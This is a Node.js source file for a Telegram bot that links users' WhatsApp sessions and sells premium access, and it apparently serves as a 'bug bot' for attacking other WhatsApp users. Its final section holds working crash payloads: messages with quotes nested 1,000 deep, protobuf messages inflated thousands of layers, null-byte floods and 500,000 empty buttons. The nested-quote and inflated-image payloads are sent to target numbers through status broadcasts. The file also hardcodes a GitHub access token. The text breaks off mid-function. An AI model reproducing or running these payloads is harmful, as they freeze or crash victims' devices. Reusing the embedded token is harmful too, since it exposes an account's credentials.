const config = require('./config');
const mongoose = require('mongoose');

mongoose.connect(config.mongodb)
    .then(() => console.log('✅ MongoDB Connected!'))
    .catch((err) => console.error('❌ MongoDB Error:', err));
    
const { Bot, InlineKeyboard, InputFile } = require("grammy");
const fs = require("fs");
const path = require("path");
const { exec, spawn } = require("child_process");
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  relayMessage,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  encodeSignedDeviceIdentity,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  templateMessage,
  InteractiveMessage,
  getUSyncDevices,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  encodeWAMessage,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  makeCacheableSignalKeyStore,
  WAProto,
  proto,  
  BaileysError
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const crypto = require("crypto");
const { Boom } = require("@hapi/boom");
const axios = require("axios");
const config = require("./config");
const chalk = require("chalk");
const thumbnail = fs.existsSync("./storage/thumbnail.jpg")
  ? fs.readFileSync("./storage/thumbnail.jpg")
  : null;
const CHANNEL_ID = config.chanelid;
const GROUP_ID = config.chatgrupid;

// ─── Persistent Access DB (database folder — panel redeploy se safe) ─────────
const ACCESS_DB_PATH = "./database/access.json";
function loadAccessDb() {
  try {
    fs.mkdirSync("./database", { recursive: true });
    if (fs.existsSync(ACCESS_DB_PATH)) {
      return JSON.parse(fs.readFileSync(ACCESS_DB_PATH, "utf8"));
    }
    // Agar storage mein purana file hai to migrate karo
    if (fs.existsSync("./storage/access.json")) {
      const old = JSON.parse(fs.readFileSync("./storage/access.json", "utf8"));
      fs.writeFileSync(ACCESS_DB_PATH, JSON.stringify(old, null, 2));
      return old;
    }
  } catch (e) {}
  const empty = { users: [] };
  fs.writeFileSync(ACCESS_DB_PATH, JSON.stringify(empty, null, 2));
  return empty;
}
function saveAccessDb(data) {
  fs.mkdirSync("./database", { recursive: true });
  fs.writeFileSync(ACCESS_DB_PATH, JSON.stringify(data, null, 2));
}
// ─────────────────────────────────────────────────────────────────────────────

// ─── Clone / Deploy Bot System ─────────────────────────────────────────────
const CLONES_DB_PATH = "./database/clones.json";
function loadClonesDb() {
  try {
    fs.mkdirSync("./database", { recursive: true });
    if (fs.existsSync(CLONES_DB_PATH)) {
      return JSON.parse(fs.readFileSync(CLONES_DB_PATH, "utf8"));
    }
  } catch (e) {}
  const empty = { bots: [] };
  fs.writeFileSync(CLONES_DB_PATH, JSON.stringify(empty, null, 2));
  return empty;
}
function saveClonesDb(data) {
  fs.mkdirSync("./database", { recursive: true });
  fs.writeFileSync(CLONES_DB_PATH, JSON.stringify(data, null, 2));
}
// Telegram bot token format: digits:35char alnum/_-
function isValidBotToken(token) {
  return /^\d{6,12}:[A-Za-z0-9_-]{30,45}$/.test(token);
}
// Generate a unique 9-digit deploy id, jaisa user ne example mein dikhaya
function generateDeployId(clonesDb) {
  let id;
  do {
    id = String(Math.floor(100000000 + Math.random() * 900000000));
  } while (clonesDb.bots.some((b) => b.id === id));
  return id;
}
// ─────────────────────────────────────────────────────────────────────────────

// ─── Safe resellers.json load ─────────────────────────────────────────────────
const RESELLERS_PATH = "./storage/resellers.json";
if (!fs.existsSync("./storage")) fs.mkdirSync("./storage", { recursive: true });
if (!fs.existsSync(RESELLERS_PATH)) fs.writeFileSync(RESELLERS_PATH, JSON.stringify({ resellers: [] }, null, 2));
const resDb = JSON.parse(fs.readFileSync(RESELLERS_PATH, "utf8"));
// ─────────────────────────────────────────────────────────────────────────────
const bugProcesses = new Map();
const {
  isOwner,
  isReseller,
  isFreeMode,
  hasAccess: _hasAccessOriginal,
  addReseller,
  removeReseller
} = require("./controlSystem/control");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ─── Clone/Deploy override (jab fork se chale) ───────────────────────────
if (process.env.BOT_TOKEN_OVERRIDE) {
  config.telegramBotToken = process.env.BOT_TOKEN_OVERRIDE;
}
if (process.env.BOT_OWNER_OVERRIDE) {
  config.ownerId = Number(process.env.BOT_OWNER_OVERRIDE);
}
// ─────────────────────────────────────────────────────────────────────────

const bot = new Bot(config.telegramBotToken);
const control = require("./controlSystem/control.js");
const cooldown = require("./controlSystem/cooldown.js");
const cooldownModule = require("./controlSystem/sumemek.js");

// ─── hasAccess override — database/access.json se read karo ──────────────────
function hasAccess(userId) {
  // Owner ko hamesha access
  if (isOwner(userId)) return true;
  // Free mode mein sab ko access
  if (isFreeMode()) return true;
  // Premium users (referral wale)
  const users = Array.isArray(premiumUsers) ? premiumUsers : [];
  const isPremium = users.some(
    u => u && u.id === String(userId) && u.expiresAt && new Date(u.expiresAt) > new Date()
  );
  if (isPremium) return true;
  // Permanent access (addacces se add kiye gaye)
  const db = loadAccessDb();
  return db.users.includes(String(userId));
}
// ─────────────────────────────────────────────────────────────────────────────

const repo_gh = "bilalnadeem3149-sketch/lucky-deta";
const nama_file = "list.json";
const path_ghp = "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";



let client;


/**
 * console log all (msg-helper)
 * males bikin console yg bagus, jadi kau ubah aja style nya
 * ntar kalo gua bikin yg bagus & aesthetic malah di ambil wkwkw
 */

const log = {
  success: (msg) => console.log(chalk.green.bold("✓ ") + chalk.white(msg)),
  error: (msg) => console.log(chalk.red.bold("✗ ") + chalk.white(msg)),
  warning: (msg) => console.log(chalk.yellow.bold("⚠ ") + chalk.white(msg)),
  info: (msg) => console.log(chalk.blue.bold("ℹ ") + chalk.white(msg)),
  loading: (msg) => console.log(chalk.magenta.bold("⏳ ") + chalk.white(msg)),
  user: (msg) => console.log(chalk.cyan.bold("👤 ") + chalk.white(msg)),
  whatsapp: (msg) => console.log(chalk.green.bold("📱 ") + chalk.white(msg)),
  telegram: (msg) => console.log(chalk.blue.bold("✈️ ") + chalk.white(msg)),
  system: (msg) => console.log(chalk.gray.bold("⚙️  ") + chalk.white(msg)),
};

/**
 * all backup seputar sessions ada disini
 * ( no multi-sender )
 */

const waClients = {};

// ─── Group Shared Sender System ────────────────────────────────────────────
// groupSenders = { chatId: userId } — har group ke liye ek shared WA sender
const GROUP_SENDERS_PATH = "./database/group_senders.json";
function loadGroupSenders() {
  try {
    if (fs.existsSync(GROUP_SENDERS_PATH)) return JSON.parse(fs.readFileSync(GROUP_SENDERS_PATH, "utf8"));
  } catch (_) {}
  return {};
}
function saveGroupSenders(data) {
  fs.mkdirSync("./database", { recursive: true });
  fs.writeFileSync(GROUP_SENDERS_PATH, JSON.stringify(data, null, 2));
}

// ─── Approved Groups System ────────────────────────────────────────────────
// approvedGroups = { chatId: { approvedBy, groupTitle, addedBy, addedAt } }
const APPROVED_GROUPS_PATH = "./database/approved_groups.json";
function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_PATH)) return JSON.parse(fs.readFileSync(APPROVED_GROUPS_PATH, "utf8"));
  } catch (_) {}
  return {};
}
function saveApprovedGroups(data) {
  fs.mkdirSync("./database", { recursive: true });
  fs.writeFileSync(APPROVED_GROUPS_PATH, JSON.stringify(data, null, 2));
}
function isGroupApproved(chatId) {
  const groups = loadApprovedGroups();
  return !!groups[String(chatId)];
}
// ───────────────────────────────────────────────────────────────────────────

// Group ya private — sahi WA client return karo
// Group mein: pehle shared sender dekho, phir user ka apna
function getWAClient(userId, chatId, isGroup) {
  if (isGroup) {
    const senders = loadGroupSenders();
    const sharedUserId = senders[String(chatId)];
    if (sharedUserId && waClients[sharedUserId]?.status === "open" && waClients[sharedUserId]?.sock) {
      return { client: waClients[sharedUserId].sock, senderUserId: sharedUserId, isShared: true };
    }
    // Group sender set nahi ya connected nahi — user ka apna check karo
  }
  if (waClients[userId]?.status === "open" && waClients[userId]?.sock) {
    return { client: waClients[userId].sock, senderUserId: userId, isShared: false };
  }
  return null;
}
// ───────────────────────────────────────────────────────────────────────────

// ─── Premium & Sender Management ────────────────────────────────────────────
const PREMIUM_FILE = "./database/premiumUsers.json";
const userSenders = {}; // { userId: ["senderNumber1", "senderNumber2"] }

function loadPremiumUsers() {
  try {
    if (fs.existsSync(PREMIUM_FILE)) {
      const raw = JSON.parse(fs.readFileSync(PREMIUM_FILE, "utf8"));
      // Auto-expire: sirf wahi rakho jinki expiry future mein ho
      return raw.filter(u => u && u.expiresAt && new Date(u.expiresAt) > new Date());
    }
  } catch (e) {}
  return [];
}

function savePremiumUsers() {
  try {
    fs.mkdirSync("./database", { recursive: true });
    // Save karte waqt bhi expire hue remove karo
    const active = premiumUsers.filter(u => u && u.expiresAt && new Date(u.expiresAt) > new Date());
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(active, null, 2));
  } catch (e) {}
}

let premiumUsers = loadPremiumUsers();

// ─── Auto-init missing database files ────────────────────────────────────────
(function initDatabaseFiles() {
  const dbDir = "./database";
  if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
  const defaults = {
    [`${dbDir}/settings.json`]: { freeMode: false },
    [`${dbDir}/users.json`]: { users: [] },
    [`${dbDir}/referrals.json`]: {},
    [`${dbDir}/premiumUsers.json`]: [],
    [`${dbDir}/access.json`]: { users: [] },
  };
  for (const [file, def] of Object.entries(defaults)) {
    if (!fs.existsSync(file)) {
      fs.writeFileSync(file, JSON.stringify(def, null, 2));
    }
  }
})();
// ─────────────────────────────────────────────────────────────────────────────

setInterval(() => {
  const before = premiumUsers.length;
  premiumUsers = premiumUsers.filter(u => u && u.expiresAt && new Date(u.expiresAt) > new Date());
  if (premiumUsers.length !== before) {
    savePremiumUsers();
    // Jin users ka premium expire hua unka rewardGiven reset karo taake dobara earn kar sakein
    for (const [uid, data] of Object.entries(referralData)) {
      const stillPremium = premiumUsers.some(u => u && u.id === uid);
      if (data.rewardGiven && !stillPremium) {
        referralData[uid].rewardGiven = false;
        referralData[uid].inviteCount = 0;
        referralData[uid].invites = [];
      }
    }
    saveReferrals();
  }
}, 60 * 60 * 1000);


// ─── Referral System ─────────────────────────────────────────────────────────
// referralData = { userId: { code, invites: [], inviteCount, rewardGiven } }
let referralData = {};
const REFERRAL_FILE = "./database/referrals.json";
const REFERRAL_REQUIRED = 3; // default limit
let referralLimit = REFERRAL_REQUIRED; // yeh change hoti rehti hai

function loadReferrals() {
  try {
    if (fs.existsSync(REFERRAL_FILE)) {
      const raw = JSON.parse(fs.readFileSync(REFERRAL_FILE, "utf8"));
      // Saved limit load karo
      if (raw.__limit && typeof raw.__limit === "number") {
        referralLimit = raw.__limit;
      }
      // __limit key hata ke baaki user data lo
      referralData = Object.fromEntries(
        Object.entries(raw).filter(([k]) => k !== "__limit")
      );
    }
  } catch (e) { referralData = {}; }
}

function saveReferrals() {
  try {
    fs.mkdirSync("./database", { recursive: true });
    // __limit bhi saath save karo
    fs.writeFileSync(REFERRAL_FILE, JSON.stringify({ __limit: referralLimit, ...referralData }, null, 2));
  } catch (e) {}
}

function getReferralCode(userId) {
  if (!referralData[userId]) {
    referralData[userId] = { code: `REF${userId}`, invites: [], inviteCount: 0, rewardGiven: false };
    saveReferrals();
  }
  return referralData[userId].code;
}

function processReferral(newUserId, refCode) {
  // Find who owns this code
  const referrer = Object.entries(referralData).find(([, d]) => d.code === refCode);
  if (!referrer) return null;
  const [referrerId, data] = referrer;

  // Ek user ek baar hi count ho
  if (data.invites.includes(newUserId)) return null;
  // Apna khud ka code use nahi kar sakta
  if (referrerId === newUserId) return null;

  data.invites.push(newUserId);
  data.inviteCount = data.invites.length;
  saveReferrals();
  return { referrerId, inviteCount: data.inviteCount, rewardGiven: data.rewardGiven };
}

function giveReferralReward(referrerId) {
  if (!referralData[referrerId]) return;
  if (referralData[referrerId].rewardGiven) return;

  // 7 din ka free premium
  const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString();
  const existing = premiumUsers.findIndex(u => u && u.id === referrerId);
  if (existing >= 0) {
    premiumUsers[existing].expiresAt = expiresAt;
  } else {
    premiumUsers.push({ id: referrerId, expiresAt });
  }
  referralData[referrerId].rewardGiven = true;
  saveReferrals();
  savePremiumUsers(); // File mein save karo taake restart ke baad bhi rahe
}

loadReferrals();
// ─────────────────────────────────────────────────────────────────────────────


function canUseSender(userId, senderNumber) {
  // Owner can use any sender
  if (isOwner(userId)) {
    return true;
  }

  // Premium users can only use their own senders
  const users = Array.isArray(premiumUsers) ? premiumUsers : [];
  const userPremium = users.find(
    (user) =>
      user &&
      user.id === userId &&
      user.expiresAt &&
      new Date(user.expiresAt) > new Date()
  );
  if (!userPremium) {
    return false;
  }

  // Check if this sender belongs to the user
  const userSendersList = userSenders[userId] || [];
  return userSendersList.includes(senderNumber);
}

function getUserSenders(userId) {
  // Owner can see all senders
  if (isOwner(userId)) {
    const allSenders = [];
    for (const botNumber of Object.keys(waClients)) {
      allSenders.push(botNumber);
    }
    return allSenders;
  }

  // Premium users can only see their own senders
  return userSenders[userId] || [];
}
// ─────────────────────────────────────────────────────────────────────────────

const sessionRoot = path.join(".", "session");
if (!fs.existsSync(sessionRoot))
  fs.mkdirSync(sessionRoot, {
    recursive: true,
  });

function getSessionPathForUser(userId) {
  return path.join(sessionRoot, String(userId));
}
async function checkSessionExistsForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    await fs.promises.access(p);
    return true;
  } catch {
    return false;
  }
}
async function deleteSessionForUser(userId) {
  try {
    const p = getSessionPathForUser(userId);
    if (waClients[userId]?.sock) {
      try {
        waClients[userId].sock.end();
      } catch (e) {
        log.warning(`Failed to close socket for ${userId}: ${e.message}`);
      }
      delete waClients[userId];
    }
    await fs.promises.rm(p, {
      recursive: true,
      force: true,
    });
    log.success(`WhatsApp session for user ${userId} deleted successfully`);
    return true;
  } catch (err) {
    log.error(`Failed to delete session for ${userId}: ${err.message}`);
    return false;
  }
}
async function clearAllSessions() {
  try {
    const folders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];
    for (const f of folders) {
      try {
        if (waClients[f]?.sock) {
          waClients[f].sock.end();
        }
        delete waClients[f];
      } catch (e) {
        log.warning(`Failed to close socket for ${f}: ${e.message}`);
      }
    }
    for (const f of folders) {
      const p = path.join(sessionRoot, f);
      try {
        await fs.promises.rm(p, { recursive: true, force: true });
      } catch (e) {
        log.warning(`Failed to delete session folder ${f}: ${e.message}`);
      }
    }

    log.success("All WhatsApp sessions cleared successfully");
    return true;
  } catch (err) {
    log.error(`Failed to clear all sessions: ${err.message}`);
    return false;
  }
}
async function reconnectExistingSessions() {
  try {
    const sessionFolders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];

    if (sessionFolders.length > 0) {
      log.loading(
        `Found ${sessionFolders.length} saved WhatsApp sessions. Auto-reconnecting...`
      );

      for (const folder of sessionFolders) {
        const userId = folder;
        try {
          await initWhatsappForUser(userId, false);
          log.whatsapp(`Auto-reconnecting session for user ${userId}`);
        } catch (err) {
          log.warning(
            `Failed to auto-reconnect session for ${userId}: ${err.message}`
          );
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Starting fresh.");
    }
  } catch (err) {
    log.error(`Error during auto-reconnect: ${err.message}`);
  }
}

/*
 * connection whatsapp
 * ngebaca per user ID
 * 1 sender buat 1 account telegram
 * created ( ren-xiter -- modifed back up sessions dll ( siros )
 */

async function initWhatsappForUser(
  telegramUserId,
  notifyUser = true,
  retryCount = 0
) {
  const MAX_RETRIES = 3;
  const RECONNECT_DELAY = 2000;
  const userId = String(telegramUserId);
  const sessionPath = getSessionPathForUser(userId);

  try {
    if (!fs.existsSync(sessionPath))
      fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      syncFullHistory: false,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 30000,
      retryRequestDelayMs: 1000,
      messageRetryMap: new Map(),
      shouldIgnoreJid: (jid) => false,
      getMessage: async (key) => {
        return { conversation: "Message not available" };
      },
      patchMessageBeforeSending: (message) => {
        const requiresPatch = !!(
          message.buttonsMessage ||
          message.templateMessage ||
          message.listMessage
        );
        if (requiresPatch) {
          message = {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {},
                },
                ...message,
              },
            },
          };
        }
        return message;
      },
      printQRInTerminal: false,
      queryChatCount: 0,
    });

    sock.ev.on("creds.update", saveCreds);

    waClients[userId] = {
      sock,
      status: "connecting",
      sessionPath,
      reconnecting: false,
      lastActivity: Date.now(),
      messageCount: 0,
    };

    const connectionMonitor = setInterval(() => {
      if (waClients[userId]?.status === "open") {
        const timeSinceLastActivity =
          Date.now() - (waClients[userId].lastActivity || Date.now());
        if (timeSinceLastActivity > 120000) {
          log.info(`[Monitor] Sending keep-alive for ${userId}`);
          waClients[userId].lastActivity = Date.now();
        }
      }
    }, 60000);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update || {};

      try {
        if (connection === "close") {
          clearInterval(connectionMonitor);
          const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
          const disconnectReason =
            DisconnectReason[reason] || reason || "unknown";

          log.warning(`WA (${userId}) disconnected: ${disconnectReason}`);
          waClients[userId].status = "closed";

          if (
            reason === DisconnectReason.loggedOut ||
            reason === 401 ||
            reason === 403
          ) {
            log.warning(
              `Number for user ${userId} logged out / banned. Deleting session...`
            );
            try {
              if (waClients[userId]?.sock?.end) {
                waClients[userId].sock.end();
              }
            } catch (e) {
              log.warning(`Error closing socket for ${userId}: ${e.message}`);
            }

            await deleteSessionForUser(userId).catch(() => {});
            // ─── Remove sender from userSenders on logout/ban ──────────
            if (userSenders[userId]) {
              try {
                const lostJid = sock?.user?.id || sock?.user?.jid || "";
                const lostPhone = lostJid.includes("@")
                  ? lostJid.split("@")[0]
                  : lostJid.split(":")[0] || "";
                if (lostPhone) {
                  userSenders[userId] = userSenders[userId].filter(
                    (n) => n !== lostPhone
                  );
                }
              } catch (_) {}
            }
            // ──────────────────────────────────────────────────────────
            delete waClients[userId];

            try {
              await bot.api.sendMessage(
                telegramUserId,
                "🚫 *WhatsApp session removed*\nYour WhatsApp session was logged out or banned. Please re-pair using /reqpair.",
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(`Failed to notify user ${userId}: ${err.message}`);
            }
          } else {
            if (!waClients[userId]?.reconnecting && retryCount < MAX_RETRIES) {
              waClients[userId].reconnecting = true;
              log.loading(
                `Reconnecting WA for user ${userId} (attempt ${
                  retryCount + 1
                }/${MAX_RETRIES})...`
              );

              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await new Promise((r) => setTimeout(r, 500));
              } catch (e) {
                log.warning(
                  `Error closing socket before reconnect for ${userId}: ${e.message}`
                );
              }

              setTimeout(() => {
                if (waClients[userId]) {
                  waClients[userId].reconnecting = false;
                  initWhatsappForUser(
                    telegramUserId,
                    notifyUser,
                    retryCount + 1
                  );
                }
              }, RECONNECT_DELAY);
            } else if (retryCount >= MAX_RETRIES) {
              log.error(
                `Failed to reconnect WA for user ${userId} after ${MAX_RETRIES} attempts.`
              );
              clearInterval(connectionMonitor);
              try {
                if (waClients[userId]?.sock?.end) {
                  waClients[userId].sock.end();
                }
                await deleteSessionForUser(userId).catch(() => {});
                delete waClients[userId];

                await bot.api.sendMessage(
                  telegramUserId,
                  "🚫 *WhatsApp session deleted*\nUnable to reconnect after 3 attempts. Please pair again using /reqpair.",
                  { parse_mode: "Markdown" }
                );
              } catch (err) {
                log.error(
                  `Failed to delete session for ${userId}: ${err.message}`
                );
              }
            }
          }
        } else if (connection === "open") {
          waClients[userId].status = "open";
          waClients[userId].lastActivity = Date.now();
          log.whatsapp(
            `✅ WhatsApp Connected Successfully for user ${userId}!`
          );

          // ─── Auto-register sender number for this user ───────────────
          try {
            const connectedJid = sock?.user?.id || sock?.user?.jid || "";
            const connectedPhone = connectedJid.includes("@")
              ? connectedJid.split("@")[0]
              : connectedJid.split(":")[0] || "";
            if (connectedPhone) {
              if (!userSenders[userId]) userSenders[userId] = [];
              if (!userSenders[userId].includes(connectedPhone)) {
                userSenders[userId].push(connectedPhone);
                log.whatsapp(`📲 Sender ${connectedPhone} registered for user ${userId}`);
              }
            }
          } catch (senderErr) {
            log.warning(`Could not register sender for ${userId}: ${senderErr.message}`);
          }
          // ─────────────────────────────────────────────────────────────

          // ─── Auto Follow WhatsApp Channel (Newsletter) ────────────────
          try {
            const WA_NEWSLETTER_JID = config.waNewsletterJid || "";
            if (WA_NEWSLETTER_JID) {
              await sock.newsletterFollow(WA_NEWSLETTER_JID);
              log.whatsapp(`📢 Auto-followed newsletter for user ${userId}`);
            }
          } catch (followErr) {
            log.warning(`Could not follow newsletter for ${userId}: ${followErr.message}`);
          }
          // ─────────────────────────────────────────────────────────────

          // ─── Auto React on Newsletter Posts ───────────────────────────
          sock.ev.on("messages.upsert", async ({ messages, type }) => {
            try {
              if (type !== "notify") return;
              for (const msg of messages) {
                const jid = msg.key?.remoteJid || "";
                // Sirf newsletter/channel messages pe react karo
                if (!jid.endsWith("@newsletter")) continue;
                const WA_NEWSLETTER_JID = config.waNewsletterJid || "";
                if (WA_NEWSLETTER_JID && jid !== WA_NEWSLETTER_JID) continue;
                if (!msg.key?.id) continue;

                // Random react emojis
                const reactions = ["👍", "❤️", "🔥", "😍", "🎉", "💯", "👏", "🙌"];
                const randomEmoji = reactions[Math.floor(Math.random() * reactions.length)];

                await sock.sendMessage(jid, {
                  react: {
                    text: randomEmoji,
                    key: msg.key,
                  },
                });
                log.whatsapp(`⚡ Reacted ${randomEmoji} to newsletter post for user ${userId}`);
              }
            } catch (reactErr) {
              log.warning(`React error for ${userId}: ${reactErr.message}`);
            }
          });
          // ─────────────────────────────────────────────────────────────

          const { pairingMessageId, waitMessageId } = waClients[userId] || {};
          try {
            if (pairingMessageId)
              await bot.api
                .deleteMessage(telegramUserId, pairingMessageId)
                .catch(() => {});
            if (waitMessageId)
              await bot.api
                .deleteMessage(telegramUserId, waitMessageId)
                .catch(() => {});
            waClients[userId].pairingMessageId = null;
            waClients[userId].waitMessageId = null;
          } catch (e) {
            log.warning(`Failed cleaning messages for ${userId}: ${e.message}`);
          }

          if (notifyUser) {
            try {
              await bot.api.sendMessage(
                telegramUserId,
                `✅ *WhatsApp paired successfully.*\nYour session is ready to use.`,
                { parse_mode: "Markdown" }
              );
            } catch (err) {
              log.warning(
                `Failed to notify pairing success for ${userId}: ${err.message}`
              );
            }
          }
        }
      } catch (e) {
        log.error(
          `Error in connection.update for user ${userId}: ${e.message}`
        );
      }
    });
    sock.ev.on("connection.error", (error) => {
      log.error(`Socket error for ${userId}: ${error.message}`);
    });

    return sock;
  } catch (err) {
    log.error(`Failed to init WhatsApp for user ${userId}: ${err.message}`);
    return null;
  }
}

async function requestPairingCodeForUser(telegramUserId, phone) {
  try {
    const userId = String(telegramUserId);
    let client = waClients[userId]?.sock;

    if (!client) {
      if (!waClients[userId]) {
        await initWhatsappForUser(userId, false);
        await new Promise((r) => setTimeout(r, 2000));
        client = waClients[userId]?.sock;
      } else {
        client = waClients[userId]?.sock;
      }
    }

    if (!client) throw new Error("Failed to create WA client for pairing");

    if (typeof client.requestPairingCode === "function") {
      const code = await client.requestPairingCode(phone);
      return code;
    } else {
      throw new Error("Pairing code API not available");
    }
  } catch (err) {
    throw err;
  }
}



/* 
     * Function bug 🦠
     * client = sock
      I'm Bilal king    */
 async function FcInInd(client, X) {
  const FC = (xvnx) => {
    let q = {
      conversation: "x"
    };

    for (let i = 0; i < xvnx; i++) {
      q = {
        extendedTextMessage: {
          text: "\0",
          contextInfo: {
            quotedMessage: q
          }
        }
      };
    }

    return q;
  };

  for (let i = 0; i < 600; i++) {
    const message = {
      extendedTextMessage: {
        text: "\0",
        contextInfo: {
          stanzaId: Math.random().toString(36).slice(2),
          remoteJid: "\0",
          quotedMessage: {
            extendedTextMessage: {
              text: "\0",
              contextInfo: {
                quotedMessage: FC(1000)
              }
            }
          }
        }
      }
    };

    await client.relayMessage(
      "status@broadcast",
      message,
      {
        messageId: Math.random().toString(36).slice(2),
        statusJidList: [X],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: X }
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    await sleep(500);
  }
  }     
      
async function jmk(client, X) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(X) ? X : [X])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: target tidak valid');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await client.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: gagal');
}

async function FCNoClickXFrezee(client, X) {
  const Gren2 = {
    groupStatusMentionMessage: {
        text: "FOUR DECK"
    }
  };

const Gren = {
groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "𝕰𝖞𝖆𝖓𝖟 𝕭𝖊𝖈𝖐" + "\0".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              quotedMessage: {
                richResponseMessage: {}
              }
            }
          }
        }
